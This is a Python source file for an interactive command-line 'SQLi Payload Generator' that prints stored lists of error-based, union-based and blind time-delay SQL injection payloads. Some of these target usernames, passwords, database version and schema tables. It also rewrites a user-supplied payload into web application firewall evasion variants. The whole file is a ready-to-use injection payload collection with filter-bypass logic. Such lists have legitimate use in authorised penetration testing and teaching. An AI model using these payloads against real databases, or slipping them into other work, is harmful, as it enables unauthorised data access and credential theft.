import base64
import urllib.parse
import binascii
import pyperclip
import random

class SQLiPayloadGenerator:
    def __init__(self):
        self.payloads = {
            "error_based": [
                "' OR 1=1 --",
                "' OR 'a'='a",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR 'x'='x",
                """' OR EXISTS(SELECT * FROM users WHERE username='admin') --""",
                "' OR (SELECT COUNT(*) FROM users) > 0 --",
                "' OR (SELECT version()) IS NOT NULL --",
                "' OR (SELECT database()) IS NOT NULL --",
                "' OR ASCII(SUBSTRING(@@version,1,1))=52 --"
            ],
            "union_based": [
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT username, password, NULL FROM users --",
                "' UNION SELECT NULL, NULL, version() --",
                "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --",
                "' ORDER BY 1 --",
                "' ORDER BY 2 --",
                "' ORDER BY 3 --",
                "' UNION SELECT NULL, user(), NULL --",
                "' UNION SELECT NULL, database(), NULL --"
            ],
            "blind": [
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' AND SLEEP(5) --",
                "' AND IF(1=1,SLEEP(5),0) --",
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' AND (SELECT ASCII(SUBSTRING((SELECT version()),1,1))) = 52 --",
                "' AND (SELECT LENGTH(database())) > 5 --",
                "' AND (SELECT table_name FROM information_schema.tables LIMIT 0,1) IS NOT NULL --",
                "' WAITFOR DELAY '0:0:5' --",
                "' AND pg_sleep(5) --"
            ]
        }

    def generate_waf_variants(self, payload):
        variants = {}
        variants["Original"] = payload
        variants["With Comments"] = payload.replace(" ", "/**/")
        variants["Case Variation"] = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
        if "SELECT" in payload.upper():
            variants["Special Characters"] = payload.replace("SELECT", "`SELECT`").replace("FROM", "`FROM`")
        return variants

    def get_error_based_payloads(self):
        return self.payloads["error_based"]

    def get_union_based_payloads(self):
        return self.payloads["union_based"]

    def get_blind_payloads(self):
        return self.payloads["blind"]


def main():
    generator = SQLiPayloadGenerator()

    while True:
        print("\n--- SQLi Payload Generator ---")
        print("1. Generate Error-Based Payload")
        print("2. Generate Union-Based Payload")
        print("3. Generate Blind SQLi Payload")
        print("4. Apply WAF Evasion to Custom Payload")
        print("5. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            payloads = generator.get_error_based_payloads()
            print("\nError-Based Payloads:")
            for i, payload in enumerate(payloads, 1):
                print(f"{i}. {payload}")

        elif choice == '2':
            payloads = generator.get_union_based_payloads()
            print("\nUnion-Based Payloads:")
            for i, payload in enumerate(payloads, 1):
                print(f"{i}. {payload}")

        elif choice == '3':
            payloads = generator.get_blind_payloads()
            print("\nBlind SQLi Payloads:")
            for i, payload in enumerate(payloads, 1):
                print(f"{i}. {payload}")

        elif choice == '4':
            original_payload = input("Enter the original payload to evade WAF: ")
            variants = generator.generate_waf_variants(original_payload)
            print("\nWAF Bypass Variants:")
            for key, val in variants.items():
                print(f"[{key}] {val}")

        elif choice == '5':
            print("Exiting SQLi Payload Generator.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
